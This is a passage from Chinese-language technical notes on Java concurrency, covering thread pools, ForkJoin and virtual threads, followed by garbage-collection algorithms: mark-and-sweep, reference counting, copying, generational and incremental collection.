本身也提供了一些快速创建的工厂方法，帮助在一些场景下简化代码逻辑：</p><ul><li><p>使用 <code>newFixedThreadPool</code> 创建固定的线程数的线程池（同时最多只有指定的线程数正在执行）；</p></li><li><p>使用 <code>newSingleThreadExecutor</code> 单个线程实例的 executor，一次执行一个线程；</p></li><li><p>使用 <code>newCachedThreadPool</code> 创建可动态调整线程数的线程池，可以应对多个短期 tasks；</p><blockquote><p>创建一个可缓存的线程池，调用 <code>execute</code> 将重用以前构造的线程（如果线程可用）。如果没有可用的线程，则创建一个新线程并添加到池中。终止并从缓存中移除那些已有 60 秒钟未被使用的线程；</p></blockquote></li><li><p><code>newScheduledThreadPool</code> 创建一个支持定时及周期性的任务执行的线程池，多数情况下可用来替代 Timer 类；</p></li></ul><blockquote><p>[!WARNING]</p><p>但是在实际生产实践中，我们不建议使用 <code>Executors</code> 来创建线程池。建议使用 <code>ThreadPoolExecutor</code> 构造函数的方式，因为后者的处理方式让开发者更加明确线程池的运行规则，规避资源耗尽的风险。</p><p>再强调一次。项目中创建多线程时，使用上面的方法线程池创建方式，无论是单一、可变、定长都有一定问题，原因是：</p><ul><li><code>FixedThreadPool</code> 和 <code>SingleThreadExecutor</code> 底层使用有界阻塞队列 <code>LinkedBlockingQueue</code>；</li><li><code>CachedThreadPool</code>：底层使用的是同步队列 <code>SynchronousQueue</code>；</li><li><code>ScheduledThreadPool</code> 和 <code>SingleThreadScheduledExecutor</code>：使用的无界的延迟阻塞队列<code>DelayedWorkQueue</code>；</li></ul><p>这些队列的最大长度为都是 <code>Integer.MAX_VALUE</code>，可能会堆积大量请求导致 OOM（为什么<strong><u>网络请求场景下，队列越长越有可能 OOM</u></strong>，请参见 “计算机系统工程 - 拥塞控制”）。</p></blockquote><p>所以实际生产环境中开发者会根据需求手动定制 <code>ThreadPoolExecutor</code> 的 7 个参数，来自定义线程池。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程池的核心线程数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">corePoolSize</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">// 能容纳的最大线程数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">maximumPoolSize</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="comment">// 空闲线程存活时间</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="variable">keepAliveTime</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line"><span class="comment">// 空闲线程存活时间 单位</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TimeUnit</span> <span class="variable">unit</span> <span class="operator">=</span> TimeUnit.MILLISECONDS;</span><br><span class="line"><span class="comment">// 创建线程的工厂类,自定义线程名称</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> <span class="string">&quot;thread-local-pool-%d&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ThreadFactory</span> <span class="variable">namedThreadFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadFactoryBuilder</span>().setNameFormat(threadName).build();</span><br><span class="line"><span class="comment">// 存放提交但未执行任务的队列</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> BlockingQueue&lt;Runnable&gt; threadFactory = <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="number">1024</span>);</span><br><span class="line"><span class="comment">// 等待队列满后的拒绝策略</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">RejectedExecutionHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.AbortPolicy();</span><br><span class="line"><span class="comment">// 定义线程池</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ExecutorService</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, threadFactory, namedThreadFactory, handler);</span><br></pre></td></tr></table></figure><h4 id="B-Implementation-ForkJoinTask"><a href="#B-Implementation-ForkJoinTask" class="headerlink" title="B. Implementation: ForkJoinTask"></a>B. Implementation: <code>ForkJoinTask</code></h4><p>而 Fork/Join 框架是针对 <code>ExecutorService</code> 接口的实现。它可以充分利用多处理器的优势，为那些可以拆成小块递归的任务设计，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (my portion of the work is small enough) </span><br><span class="line">    do the work directly </span><br><span class="line">else </span><br><span class="line">    split my work into two pieces </span><br><span class="line">    invoke the two pieces and wait for the results </span><br></pre></td></tr></table></figure><p>在 <code>ForkJoinTask</code> 子类（<code>RecursiveTask</code> 有返回值、<code>RecursiveAction</code> 无返回值）中定义这些任务。</p><h3 id="7-8-3-Other-Utilities"><a href="#7-8-3-Other-Utilities" class="headerlink" title="7.8.3 Other Utilities"></a>7.8.3 Other Utilities</h3><h4 id="Concurrent-Collections"><a href="#Concurrent-Collections" class="headerlink" title="Concurrent Collections"></a>Concurrent Collections</h4><p>Concurrent Collections：更容易地管理大规模数据，减少 <code>synchronization</code> 次数；</p><h4 id="Atomic-Variables"><a href="#Atomic-Variables" class="headerlink" title="Atomic Variables"></a>Atomic Variables</h4><p>Atomic Variables：针对变量粒度的同步机制，可以在一定程度上避免 data inconsistency；</p><p>All classes have get and set methods that work like reads and writes on volatile variables</p><h4 id="Virtual-Threads"><a href="#Virtual-Threads" class="headerlink" title="Virtual Threads"></a>Virtual Threads</h4><p>Java 中是一类轻量级线程解决方案。让线程创建、调度、管理的开销最小化。</p><p>Virtual Threads 是 Java Thread 的实例，这与任何 OS thread 是相互独立的。</p><p>当 virtual threads 内部调用了阻塞的 I/O 操作后，会立即被 JVM 挂起；</p><p>virtual threads 有一个有限的 call stack，并且只能执行一个 HTTP client 请求 / JDBC 查询。这对一些异步的耗时任务比较合适，但是不适合 CPU intensive tasks；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">virtualThread</span> <span class="operator">=</span> Thread.ofVirtual().start(() -&gt; &#123;</span><br><span class="line">    <span class="comment">// Code to be executed by the virtual thread</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>所以 Virtual Threads 不是说会比普通线程更快，而是说比普通线程更具可扩展性（provide scale），这在高并发、每次请求处理耗时的服务器网络应用中能提升吞吐量。</p><p><code>ThreadLocalRandom</code>：为多线程提供高效的伪随机数生成方案；</p><h1 id="Chapter-8-Java-Garbage-Collection"><a href="#Chapter-8-Java-Garbage-Collection" class="headerlink" title="Chapter 8. Java Garbage Collection"></a>Chapter 8. Java Garbage Collection</h1><p>本章，我们将先从 “为什么需要垃圾回收”、“垃圾回收的思路是什么”（8.1）出发，先介绍现存的主流语言（Python/JavaScript 等）甚至操作系统（Android）究竟采用了哪些垃圾回收方式（8.2 ~ 8.7），然后再来看看 Java 语言自己是怎么做垃圾回收的（8.8 ~ 8.9）。</p><h2 id="8-1-Problem-Definition"><a href="#8-1-Problem-Definition" class="headerlink" title="8.1 Problem Definition"></a>8.1 Problem Definition</h2><h3 id="8-1-1-Why-amp-How"><a href="#8-1-1-Why-amp-How" class="headerlink" title="8.1.1 Why &amp; How"></a>8.1.1 Why &amp; How</h3><p>通常情况下，无论是什么语言，在运行时想要分配空间，要么放在栈上、要么放在堆上。</p><p>栈上分配的变量全权由编译器管理（如果你写过编译器，请回想一下令人讨厌的 global frame size），这也是绝大多数语言的（解释型语言则是解释器）共性；</p><p>但是部分语言的有一部分空间是分配在堆上的。例如 tiger 语言中，我们初始化数组/结构体，它调用的 runtime function 底层由 C++ 实现，最终就是分配在堆上的。</p><p>如果这类使用堆空间的语言，在运行时不及时释放堆空间，可能会导致堆溢出的问题。由于像 tiger 这样的语言不涉及底层的结构（包括 Python、Java 等等），没有指针的概念，自然也没办法自己释放，或者这种语言的定位就是不需要开发者来释放（所谓 “内存安全”），那么还需要借助<strong><u>运行时机制</u></strong>来管理堆空间。</p><p>垃圾回收的基本原理就是，当一个被分配的地址没办法被当前的任何指针/变量访问到（not reachable），那么就需要运行时工具帮助释放这片空间，使得它能够被重新分配和使用。</p><blockquote><p>更准确一点，其实应该进行 liveness analysis（就像前面设计编译器时做的），但是运行时显然不方便做这种静态分析（运行时难以看出）。因此人们通常使用可达性（reachability）来代替 liveness 进行分析，只不过 reachability 可能没有 liveness 那么及时 / 精确（还可能出现一些问题，后面讨论）。</p><p>也就是说，如果存活，一定可达（这是由各个语言的编译器保证的）。</p></blockquote><p>于是，垃圾回收的过程就是，从当前已知存活的变量开始（例如当前栈帧上、寄存器中正在使用的变量），递归地去搜索可达的内存区域，再把分配过、但不可达的内存释放即可。</p><blockquote><p>我们通常使用有向图去描述 “两个存活变量间的可达关系”：结点表示程序当前栈上/寄存器中正在使用的变量 和 堆上分配的记录，边表示地址指针；</p></blockquote><p>所以，<strong>几乎所有自动 GC 都遵循一个理念：按照某个策略<u>预定的时间</u>（定时策略），释放<u>不再继续使用的</u>（标记策略）<u>引用类型变量</u>所占用的空间</strong>；</p><blockquote><p>为什么加上了 “定时”：运行时是动态的，总不能只回收一次，或者一直回收；</p></blockquote><h3 id="8-1-2-GC-Metrics"><a href="#8-1-2-GC-Metrics" class="headerlink" title="8.1.2 GC Metrics"></a>8.1.2 GC Metrics</h3><p>另外还有一点需要注意的是，GC 通常会伴随一段时间的 STW（stop-the-world，时停），此时段间，无论这个语言是单线程还是多线程的，都需要全部暂停等待 GC 的处理。</p><p>这样的 STW 在大多数 GC 算法中都是必要的，不过有长有短（取决于具体算法）。这主要是因为 GC 在运行时总有一些数据需要确保 synchronization，防止并发的回收造成数据不安全的问题。我将 STW 的时长称为 <strong>GC 算法的时延（GC latency）</strong>；</p><p>还有一点需要明确的是，我们引入 GC 是为了防止内存泄漏。而 “内存泄漏” 这个概念本身<strong><u>并不是</u></strong>说没有回收完所有的不再使用的空间就是泄漏了，而是<strong><u>没有及时的回收不再使用的堆空间，引发的一系列问题，包括堆溢出</u></strong>。</p><p>所以重点在于 “及时” 而不是 “全部”。也就是说，一个 GC 算法可以不需要在一次回收过程清理掉全部的垃圾，而是只需要确保及时就行。</p><p>于是我们还可以定义 <strong>GC throughput</strong>，即一次 GC 操作中，单位时间内回收记录的数量，这个指标能间接反映这个 GC 算法的效率，以及它究竟是否 “及时”。</p><h2 id="8-2-Mark-amp-Swap"><a href="#8-2-Mark-amp-Swap" class="headerlink" title="8.2 Mark &amp; Swap"></a>8.2 Mark &amp; Swap</h2><p>一种 GC 策略是 “标记清除”（Mark-And-Swap，标记策略）+ 溢出清理（定时策略）：</p><ul><li><p>Mark：从可达有向图的根结点（已知存活的变量）开始遍历，将遇到的所有结点全部标记一遍；</p></li><li><p>Swap：将整个堆扫描一遍，把没有标记的结点放到 free list 中（相当于释放），并且清空所有标记（为下一轮 GC 准备）；</p></li><li>程序在 GC 开始时 freeze，在 GC 结束时 resume，从 free list 中分配堆空间；</li><li>程序只有在 free list 为空时才进行 GC；</li></ul><blockquote><p>目前正在使用这个策略的语言有 JavaScript；</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Mark phase:</span><br><span class="line">    for each root v</span><br><span class="line">        DFS(v)</span><br><span class="line"></span><br><span class="line">Sweep phase:</span><br><span class="line">    p &lt;- first address in heap</span><br><span class="line">    while p &lt; last address in heap</span><br><span class="line">        if record p is marked</span><br><span class="line">            unmark p</span><br><span class="line">        else let f1 be the first field in p</span><br><span class="line">            p.f1 &lt;- freelist</span><br><span class="line">            freelist &lt;- p</span><br><span class="line">        p &lt;- p + (size of record p)</span><br><span class="line"></span><br><span class="line">function DFS(x)</span><br><span class="line">    if x is a pointer and points to record y</span><br><span class="line">        if record y is not marked</span><br><span class="line">            mark y</span><br><span class="line">        for each field fi of record y</span><br><span class="line">            DFS(y.fi)</span><br></pre></td></tr></table></figure><p>这样做的优缺点：</p><ul><li><p>优点：算法简单便于实现，很多情况下确实是有效的（满了就回收全部的垃圾）；</p></li><li><p>缺点：性能不佳（扫描全堆，throughput 不大），而且需要经常打断程序执行流先做垃圾回收，程序效率不佳（总体 STW 很长）。</p></li></ul><p>分析一下：</p><p>$T=c_1R+c_2H$（$R$ 为可达变量数、$H$ 为堆大小），每次增长 free list entry 数量 $H-R$，因此总体均摊时间：$\overline{T}=\dfrac{c_1R+c_2H}{H-R}$；</p><p>于是我们知道：当 $H$ 和 $R$ 很接近的时候，GC 的性能会很差。因此我们的改进是，在 $\dfrac{R}{H}\gt0.5$ 的时候建议 OS 增大当前进程的堆的大小；</p><p><u>第二个改进</u>，是考虑到如果只使用 DFS 函数调用递归很可能导致栈溢出（因为堆本身是很大的），考虑引入 显式的栈来实现 DFS；</p><blockquote><p>更有技巧一点的话，还有 pointer reversal 这类优化的方法。但是本文的主题不是讨论这些算法，因此略过，感兴趣的读者可以自行搜索。</p></blockquote><p><u>第三个改进</u>，对于 free list，我们可以模仿 Memory Allocation 的 aggregation list，管理多个 free list 并按照列表的大小来分类；</p><h2 id="8-3-Reference-Count"><a href="#8-3-Reference-Count" class="headerlink" title="8.3 Reference Count"></a>8.3 Reference Count</h2><p>还有一类常见的 GC 策略是 “引用计数”（标记策略）+ 分配时清理（定时策略）；</p><blockquote><p>目前使用这种 GC 策略的语言有 Python、Swift 等等；</p></blockquote><p>这里我们对每一个在堆上的 record 维护一个额外的字段（<code>ref_cnt</code>）表明当前有多少变量指向它。</p><p>然后在赋值、作用域变化等等情况时更新变量对应的值就行。</p><blockquote><p>举个例子，例如 record <code>x</code> 的某个 field <code>x.fi</code> 原本是 <code>z</code>（是堆上的 record）赋值为 <code>y</code>（另一个堆上的 record）此时：</p><ul><li>读写 <code>y</code> 的 reference count 使其增加；</li><li>读写 <code>z</code> 的 reference count 使其减少；</li><li>检查 <code>z</code> 的 reference count 如果是 0，则将 <code>z</code> 加入 freelist；</li><li>而 <code>z</code> 中的字段（例如 <code>z.fi</code>）如果是堆上的指针，则<u>推迟到 <code>z</code> 所在的地址被从 free list 分配出去时再减小 reference count</u>；</li></ul></blockquote><p>于是相较于同步的 Mark-and-Swap，引用计数的好处是：</p><ul><li>避免了批量、递归的检查回收操作，将部分的更新引用计数操作推迟到分配时（批处理提升了 GC throughput）；</li><li>不需要频繁进行全堆扫描，提升了程序执行效率（压缩了 STW 的时长）；</li></ul><p>只不过引用计数还引入了一些问题：</p><ul><li><p>循环引用：相互引用的变量无法让 <code>ref_cnt</code> 减为 0（信息不充分会导致回收不充分）；</p><blockquote><p>解决方法 1：引入语义层面的语法特性，例如<strong><u>弱引用</u>（Weak References）</strong>，当内存压力比较大的时候，将这种弱引用视为没有引用。</p><p>但是这相当于把难题丢给了开发者，容易导致程序运行时错误的出现（例如使用一个被释放了的弱引用变量）；</p><p>解决方法 2：进行简单的 cycle detection，对某些容易成环的地方进行特殊检查，及时除环；</p><p>解决方法 3：与 mark &amp; swap 结合（occasional），补上全局信息，但 mark 操作很昂贵；</p></blockquote></li><li><p>内存访问性能问题：例如 <code>x.fi &lt;- p</code> 这个语句在加上引用计数的 GC 后，会变成 3 次内存访问，性能可能更差些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">z &lt;- x.fi</span><br><span class="line">c &lt;- z.count</span><br><span class="line">c &lt;- c – 1</span><br><span class="line">z.count &lt;- c</span><br><span class="line">if c = 0 call putOnFreelist</span><br><span class="line">x.fi &lt;- p</span><br><span class="line">c &lt;- p.count</span><br><span class="line">c &lt;- c + 1</span><br><span class="line">p.count &lt;- c</span><br></pre></td></tr></table></figure></li></ul><p>正因为这两个问题，我们常常在一些 GC 学术原型中才能见到它，实际使用这种方法会出现一些难以避免的性能问题。但是不可否认的是，这种方法（思路）真的很简单和显然，所以它也被常常应用到其他的领域和方面。例如 file table 维护文件打开状态时使用、虚拟页和物理页的映射时物理页维护引用计数、C++ 的智能指针 <code>shared_ptr</code> 等等。</p><h2 id="8-4-Copy-Collection"><a href="#8-4-Copy-Collection" class="headerlink" title="8.4 Copy Collection"></a>8.4 Copy Collection</h2><p>这类 GC 策略比较新，有些现代的应用（例如 Android 10+）就在使用这种 GC 策略。内容如下：</p><ul><li><p>将 heap 拆成两个部分：from-space &amp; to-space；</p><p>from-space 专门存放分配的内容，to-space 专门管理回收的内容；</p></li><li><p>两个 space 都有一个 <code>limit</code> 指针表示该区域结尾；</p></li><li><p><code>next</code> 表示该区域接下来要插入的位置，分配内存就是向 <code>next</code> 后面追加可达的 entry；</p></li><li><p>如果 <code>next</code> 到 <code>limit</code> 的位置，证明当前的 semi-space 满了，我们从 <code>root</code> 根结点（目前肯定存活的）开始，将所有可达结点 copy 到另一个 semi-space 中（<code>next</code> 也移过去了），相当于丢弃了不可达结点、变相进行了一次 GC；</p></li></ul><p>这样做有几点好处：</p><ul><li>不需要特地进行 mark + sweep 了，操作更简单，降低了时间复杂度，一次 copy 足矣（进一步降低 STW 长度）；</li><li>每次 copy 都相当于整理出了连续的空闲堆空间，方便分配、减小了 external fragments，最大化 memory utilization；</li></ul><p>相比于 mark-and-sweep 也有坏处：</p><ul><li>如果大部分变量存活时间很长（$R\sim H$），会导致内存拷贝过多，overhead 很大；</li><li>一半的空间利用率低下；</li></ul><p>实现 Copy Collection 的算法是 Cheney’s algorithm：</p><p><img src="imgs/gc-cc-cheney-algo.png" width="400px" /></p><blockquote><p>解释一下算法：</p><p>把当前准备切走的一边称为 from-space，另一边称为 to-space；</p><p>每个被分配的 entry（$p$）的第一个字段（$f_1$）保存<u>指向当前分配对象自己</u>的指针（只有在移动更新时指向新的对应的 entry），其他字段（$f_i$）存放正常被分配的数据；</p><p><code>Forward(p)</code> 函数的含义是将 <code>p</code> 指针对应的结点数据完全移动到 to-space（如果已经完成移动则什么也不做）；</p><p>主函数的算法就是从根结点开始（先 forward 根结点）BFS 遍历结点、更新 <code>scan</code>，遍历到的直接调用 <code>Forward</code> 转移。同时需要更新拿在手上的指针，保证上层应用无感；</p></blockquote><p>这种算法有些优缺点：</p><ul><li>优点：不引入额外数据结构（没有额外的栈、不需要 reversal pointers）；</li><li>缺点：影响原来程序的 locality！无法充分利用局部性（不相干的 record 可能被复制到一起），这会降低每次 GC 后的程序执行效率；</li></ul><p>因此我们作出优化：<strong><u>Semi-depth-first Algorithm</u></strong>，这也是 Copy Collection 最常见的实现方法：</p><p><img src="imgs/gc-semi-df.png" width="700px"/></p><p>这个算法的思路是 DFS，所以主函数省略了（就是对每个 root 结点调用 <code>Forward</code> 然后结束）。这个 <code>Forward</code> 函数我们在 Cheney’s Algorithm 中见过类似的结构，就是如果当前 entry（由 <code>p</code> 指向）完全移到 to-space（第一字段已经在 to-space 了），那么就直接返回，否则调用 <code>chase</code> 迁移；</p><p>主要看 <code>Chase(p)</code> 的做法。<code>q</code> 和 <code>next</code> 有点像算法里的左右指针，<code>q</code> 表示当前正在迁移的 entry 的开头，<code>next</code> 则表示正在迁移的 entry 的结尾；</p><p>而 <code>r</code> 和 <code>p</code> 又像一对前后指针，<code>p</code> 表示当前正在 copy 的节点，<code>r</code> 则是一轮 semi-DFS 从根到叶遍历的指针；</p><p>中间 <code>for</code> 循环的作用是把要 copy 的 <code>p</code> 指向的 entry 的每个字段都复制到 to-space 中。同时 <code>Chase</code> 还需要考虑 <code>p</code> entry 中指向 from-space（分配在堆上但没迁移的 entry）的指针。</p><blockquote><p>为什么 <code>Chase</code> 需要考虑 <code>p</code> 中的指向 from-space 的指针？因为这里是 DFS，不能直接结束对 <code>p</code> 的迁移，否则就变成 BFS 了（Cheney’s Algorithm）；应该像这样一直沿树边递归到底；</p></blockquote><p>一轮 semi-DFS 后，如果 <code>p</code> 有多个 field 都指向堆，那么默认是先 copy 当前 <code>p</code> entry 中的最后一个 from-space 分配的地址，方便 <code>repeat</code> 循环递归（DFS）地移动 from-space 中分配的 entries；</p><blockquote><p>为啥是 copy 最后一个？因为递归过程一次只能保存一个，这也是算法称为 “semi-DFS” 的原因（没有完全遵循 DFS 的遍历方法）。更清楚一点，我们可以看下面的比较图（注意到 4、6 是最后才访问的）：</p><p><img src="imgs/gc-semi-dfs.png" width="350px" /></p><p>例如 <code>1 -&gt; 2 -&gt; 5</code> 后，一轮 semi-DFS 结束，虽然看到了 <code>4</code> 对应的 record，但也只是更新了 <code>2</code> 的 record 的指针，并没有 copy <code>4</code> 的 record 到 to-space；随后递归回溯到 <code>1</code> 再继续；</p></blockquote><h3 id="Optimizations"><a href="#Optimizations" class="headerlink" title="Optimizations?"></a>Optimizations?</h3><p>注意到，copy collection 对于堆空间的浪费还是很严重的，因为每次只使用一半的堆空间（另一边必须是无效的）。于是一个很简单的优化是，底层使用 <code>mmap</code> 来处理对堆空间的分配。我们可以让另一半（不在使用的 to-space）在 copy 前是 unmap 的状态（未分配物理页），这样能更充分地利用机器资源。</p><blockquote><p>但这么做也有点问题，在 GC collector 进行 copy collection 的途中可能出现物理内存猛增的情况；</p><p>但这确实能缓解在除了 GC 阶段以外的其他时间里内存不够用的情况。</p></blockquote><p>注意到 Copy Collection 的均摊开销主要在 $\dfrac{c_3R}{\dfrac{H}{2}-R}$ 左右（$c_3\sim10$，$R$ 为存活记录的大小）；那么我们如何降低上述内存使用，并且继续提升整体 GC 性能呢？</p><h2 id="8-5-General-Collection-Generations"><a href="#8-5-General-Collection-Generations" class="headerlink" title="8.5 General Collection (Generations)"></a>8.5 General Collection (Generations)</h2><h3 id="8-5-1-Design"><a href="#8-5-1-Design" class="headerlink" title="8.5.1 Design"></a>8.5.1 Design</h3><p>一般情况下，GC 的 throughput 和 latency 是相互制约的，例如我想要确保 throughput 很大，一般需要扫描更多的信息来进行批处理，但扫描更多的信息会导致 latency 的延长。</p><p>但是这种 GC 的策略相较于前面几种方法，可以同时提升 throughput、降低 latency。主要是人们有以下的特性的观察（不是准确和普适的定律，而是经验假设）：</p><ul><li>堆上新创建的对象通常更容易先死去；</li><li>堆上存活的时间越长的对象通常更不容易死去；</li></ul><blockquote><p>堆上存活时间长的越长，短的越可能更短。也许可以用马太效应解释；</p></blockquote><p>基于这个特性，人们提出了 general collection 的 GC 策略（分代）：</p><ul><li><p>将 heap 分为若干区域 $G_0,\space G_1,\space G_2,\ldots$，编号从小到大存放的是创建对象的由新到旧（新生代 ~ 持久代）。被分配的对象首先被放入 $G_0$；</p></li><li><p>$G_0,G_1,\ldots$  这些代（generations）一般使用 Marking 的思路（给数据标记）；</p></li><li><p>GC collector 重点回收 $G_0$ 区域的对象。同时需要关注 $G_1,G_2,\ldots$ 中指向 $G_0$ 区域的指针（如果存在，$G_0$ 的这个区域就不能释放）；</p><blockquote><p>其实 $G_1,G_2,\ldots$ 中有指向 $G_0$ 区域的指针 这件事本身就很罕见。主要是因为根据经验假设，$G_0$ 只有很少一部分新生对象会进入 $G_1$ 以及更旧的代（10%-20%），而 $G_1$ 中的指针更普遍的是指向自己代或者更旧的代（因为先定义再使用嘛），更少有指向新一代的指针。</p><p>相反的情况，如果 $G_0$ 中的数据有些指向 $G_1,G_2,\ldots$ 区域的指针，那么它们可以立即被释放；</p></blockquote></li><li><p>每次 $G_0$ 未能清空 N 次（N 一般是 2~3 左右，应该看不同应用场景）的部分会转移到 $G_1$，并且更旧的代同理，依次进行；也正因如此，$G_0,G_1,\ldots$ 各代间的大小差距最好是指数级的；</p></li></ul><p>这样做带来的好处是，每次回收只需要扫描原先 20% 左右的区域，但是能回收率能达到 80%，不仅减小了 latency（扫描的区域少了），而且增大了 throughput（单位时间回收的量增多了），极大提升 GC 效率。</p><p>这种策略的均摊时间开销：$\dfrac{c_3R}{H-R}$（和 Copy Collection 相比，$\dfrac{H}{2}$ 变为 $H$）；并且通常情况下，由于 $G_0$ 本身不大，因此很多情况都有 $H\gt10R$，也就是说一般情况的均摊复杂度 $\dfrac{1}{9}c_3$（相对于前面的策略效率提升了 10 倍，如果只考虑 $G_0$ 的话）！</p><p>可是，如果涉及更旧代的回收，时间开销还是很大的（例如如果只有两代，并且做一次 $G_0,G_1$ 回收，就相当于扫描了整个堆）。不过好在需要回收旧代的频率并不是很高。</p><h3 id="8-5-2-Patch-Ways-of-Remembering"><a href="#8-5-2-Patch-Ways-of-Remembering" class="headerlink" title="8.5.2 Patch: Ways of Remembering"></a>8.5.2 Patch: Ways of Remembering</h3><p>现在回过头看一下，如果使用 general collection，有个问题是我们 “同时需要关注 $G_1,G_2,\ldots$ 中指向 $G_0$ 区域的指针”。</p><p>虽然就像前面说的，这种情况很罕见，但还是需要考虑的，例如堆上分配的结构体在它被分配的很久以后突然更新了一个字段，这种情况就可能出现上述罕见的现象。于是我们<u>需要单独保存一些旧代中有指针指向新代的信息</u>（不然 GC collector 很难判断 $G_0$ 中会不会出现上述罕见情况，而且全表扫描太慢了）。</p><p>为了解决这个问题，人们首先想出了借助一个 Remembered List 的方法：每次更新被分配 entry 的某个字段时，向这个 list 中加入一条更新的记录。这种方法有个问题，就是实际上可用的堆的空间一般很大，平均需要记录的更新数据可能会达到数个 MB，这对于一个内存中的列表而言开销已经比较大了。</p><p>于是人们想使用 Remembered Set 来存放，因为它的去重性质，我们可以在分配的 object $b$ 中使用 1 个 bit 来记录它是否已在 remembered set 中；</p><p>以上两种方法的粒度都是对象（很细），免不了占用比较大的内存资源。</p><p>于是人们提出了粗粒度的信息存放方案（<strong><u>Card Marking</u></strong>，比较主流的实现方案）：</p><ul><li>将内存分为 $2^k$ bytes 大小的内存区域，称为 logical cards（逻辑卡片）；</li><li>一个对象可以占据一个卡片的一部分，或者从卡片中间区域开始占据到后面的卡片；</li><li>当 $b$ 地址在分配后被更新时，包含这个地址的卡片会被标记；</li><li>可以用更小的 list（byte index 向右移动了 $k$ 位）来保存 mark 的情况；</li></ul><p>具体实现就是在每次更新 object 时打桩（在 <code>obj.f = a</code> 的后面加上代码，判断如果确实是 <code>G1</code> 指向 <code>G0</code> 的情况，则从 card 对应的 list 中取出并更新）；</p><p>坏处：不清楚在这片区域的 cross generation pointer 具体在哪里，还需要在这片区域内继续查找（空间换时间）；</p><p>另一种方法是用 Page 的粒度来管理这个信息（<strong>Page Marking</strong>）：</p><ul><li>就像 card marking，不过 $2^k$ 是页表大小；</li><li>更新一个分配的 object 相当于 makes the page dirty；</li><li>用户态程序可以在每次 GC 后标记 write-protected；</li></ul><p>这样相当于把 card marking 的打桩操作变成了用户态的 fault handler。但实际上开销也不小（毕竟需要进出内核以及用户态 handler）；</p><h2 id="8-6-Incremental-Collection"><a href="#8-6-Incremental-Collection" class="headerlink" title="8.6 Incremental Collection"></a>8.6 Incremental Collection</h2><p>这里还有个更加复杂的回收策略，和实际应用结合得比较紧密。</p><p>这个策略着重关注于优化 STW 时长（latency）这个指标，希望 GC 让应用停止的时间尽可能短（尤其是在涉及 UI 前台类型/端侧的语言中，不希望用户感受到卡顿）；</p><p>比如对于数十 GB 的内存而言，同步的 Mark &amp; Swap 的 STW 可能在百毫秒级别，这对后台程序 / 服务器应用而言不那么关心，但是如果是端侧设备 / 浏览器 / 游戏设备 / 精确的嵌入式设备呢？这个问题就很突出了。</p><p>这个时候，两种思路：</p><ul><li>让 GC 回收程序和应用并发执行（从根本上极大缩短甚至基本消灭 STW）；</li><li>让 GC 回收程序按应用执行的情况增量地回收（通过减少需要扫描的数据量，也能极大缩短 STW）；</li></ul><p>这时我们需要引入一些概念：</p><ul><li><p>Collector：专门收集不再使用的分配的空间并释放；</p></li><li><p>Mutator：改变 reachable data 的关联图；</p><blockquote><p>将应用中改变 reachable 关系的逻辑抽象出来，它就是之前阻碍 GC collector 并发，也是 STW 出现的主要原因；</p></blockquote></li><li><p>Incremental Collection：只有 Mutator 需要 Collector 回收时才进行回收（调用式关系）；</p></li><li><p>Concurrent Collection：在 Mutator 执行期间 Collector 并发执行（后台服务关系）；</p></li></ul><p>现在介绍一种 Incremental Collection 的实现模型：<strong><u>Tricolor Marking</u>（三色标记模型）</strong>；</p><p>任意一个被分配的记录只会处于 3 种颜色中：</p><ul><li>White: not visited by GC；</li><li>Grey: visited by GC, but its children are not；</li><li>Black: visited by GC, so as its 